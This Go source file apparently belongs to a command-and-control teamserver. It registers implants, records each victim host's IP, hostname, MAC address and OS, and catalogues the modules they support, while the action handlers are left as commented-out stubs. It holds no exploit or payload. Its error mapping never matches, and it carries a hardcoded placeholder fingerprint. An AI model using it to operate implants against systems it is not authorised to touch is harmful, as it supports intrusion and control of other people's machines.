package comms

import (
	"crypto/sha1"
	"encoding/json"
	"fmt"

	"github.com/ProjectHivemind/Teamserver/teamserver/pkg/crud"
	"github.com/ProjectHivemind/Teamserver/teamserver/pkg/model"
	"github.com/google/uuid"
)

// HandleMessage takes the packet and decides what to do with it
func HandleMessage(packet Packet) ([]Packet, error) {
	switch packet.PacketType {
	case ActionRequestEnum:
		// return ActionRequestHandler(packet)
	case ActionResponseEnum:
		// return ActionResponseHandler(packet)
	case RegisterRequestEnum:
		return RegisterRequestHandler(packet)
	default:
		break
	}
	return nil, fmt.Errorf("no a valid PacketType")
}

// ActionRequestHandler checks to see if there are any actions queued for the
// given implant.
// func ActionRequestHandler(packet Packet) ([]Packet, error) {

// }

// ActionResponseHandler updates the database with any responses from the
// implant's action
// func ActionResponseHandler(packet Packet) ([]Packet, error) {

// }

// RegisterRequestHandler handles the request to register an implant
func RegisterRequestHandler(packet Packet) ([]Packet, error) {
	var allPackets []Packet
	register := RegistrationRequest{}

	err := json.Unmarshal([]byte(packet.Data), &register)
	if err != nil {
		return nil, err
	}

	h := sha1.New()
	h.Write([]byte(register.ImplantName))
	h.Write([]byte(register.ImplantVersion))
	tmp := h.Sum(nil)
	id := fmt.Sprintf("%x", tmp)

	supportModulesStr, err := ModuleCheckHandler(register.SupportedModules)
	if err != nil {

	}

	implantType := model.ImplantType{
		UUID:           id,
		ImplantName:    register.ImplantName,
		ImplantVersion: register.ImplantVersion,
	}

	implant := model.Implant{
		UUID:             uuid.New().String(),
		UUIDImplantType:  id,
		PrimaryIP:        register.IP,
		Hostname:         register.Hostname,
		MAC:              register.MAC,
		ImplantOS:        register.OS,
		OtherIPs:         register.OtherIPs,
		SupportedModules: supportModulesStr,
	}

	var d crud.DatabaseModel
	d.Open()
	defer d.Close()

	success := true
	_, err = d.GetImplantTypeById(implantType.UUID)
	if err != nil {
		check, err := d.InsertImplantType(implantType)
		if err != nil || check == false {
			success = false
		}
	}

	_, err = d.GetImplantById(implant.UUID)
	if err != nil {
		check, err := d.InsertImplant(implant)
		if err != nil || check == false {
			success = false
		}
	}

	if success {
		resp := RegistrationResponse{UUID: implant.UUID}
		bytes, _ := json.Marshal(resp)

		respPacket := Packet{
			Fingerprint: "123456789",
			Implant: ImplantInfo{
				UUID:      implant.UUID,
				PrimaryIP: implant.PrimaryIP,
			},
			PacketType: 5,
			NumLeft:    0,
			Data:       string(bytes),
		}
		allPackets = append(allPackets, respPacket)
	} else if !success {
		commErr := ComError{
			ActionID: "-1",
			ErrorNum: ErrorHandler(err),
		}
		bytes, _ := json.Marshal(commErr)

		errPacket := Packet{
			Fingerprint: "123456789",
			Implant: ImplantInfo{
				UUID:      "",
				PrimaryIP: register.IP,
			},
			PacketType: -1,
			NumLeft:    0,
			Data:       string(bytes),
		}
		allPackets = append(allPackets, errPacket)
	}

	return allPackets, nil
}

// ModuleCheckHandler inserts any new modules and returns SupportedModule string slice
func ModuleCheckHandler(newModules []ModuleInfo) ([]string, error) {

	moduleStr := []string{}
	if len(newModules) > 0 {
		// Open the database connection
		var d crud.DatabaseModel
		d.Open()
		defer d.Close()

		// Check all of the module functions with the database
		for i := 0; i < len(newModules); i++ {
			name := newModules[i].ModuleName
			moduleStr = append(moduleStr, name)
			_, err := d.GetModuleByName(name)

			// If the module is not in the database add it
			if err != nil {

				var moduleFuncs []model.ModulesFuncs
				moduleFuncNames := []string{}
				for j := 0; j < len(newModules[i].ModuleFuncs); j++ {
					tmpFunc := newModules[i].ModuleFuncs[j]

					newFunc := model.ModulesFuncs{
						UUID:            uuid.New().String(),
						ModuleFuncName:  tmpFunc.ModuleFuncName,
						NumOfParameters: tmpFunc.ParamNum,
						ParameterTypes:  tmpFunc.ParamTypes,
						ParameterNames:  tmpFunc.ParamNames,
					}
					moduleFuncs = append(moduleFuncs, newFunc)
					moduleFuncNames = append(moduleFuncNames, tmpFunc.ModuleFuncName)
				}

				// Insert the module after running checks
				module := model.Modules{
					ModuleName:      name,
					ModuleFuncNames: moduleFuncNames,
				}
				check, err := d.InsertModule(module)
				if err != nil {
					return nil, fmt.Errorf("MissingRequiredData")
				}

				if check == true {
					for i := 0; i < len(moduleFuncs); i++ {
						_, err = d.InsertModuleFunc(moduleFuncs[i])
						if err != nil {
							return nil, fmt.Errorf("MissingRequiredData")
						}
					}
				}

			}
		}

	} else {
		newModules = nil
	}

	return moduleStr, nil
}

// ErrorHandler converts the error into the enum value
func ErrorHandler(err error) int {
	switch err {
	case fmt.Errorf("NotRegistered"):
		return NotRegisteredEnum
	case fmt.Errorf("UnknownModule"):
		return UnknownModuleEnum
	case fmt.Errorf("UnknownModuleFunc"):
		return UnknownModuleFuncEnum
	case fmt.Errorf("MissingRequiredData"):
		return MissingRequiredDataEnum
	case fmt.Errorf("ModuleTimeout"):
		return ModuleTimeout
	case fmt.Errorf("DuplicateRegistration"):
		return DuplicateRegistration
	default:
		return UnknownErrorEnum
	}

}
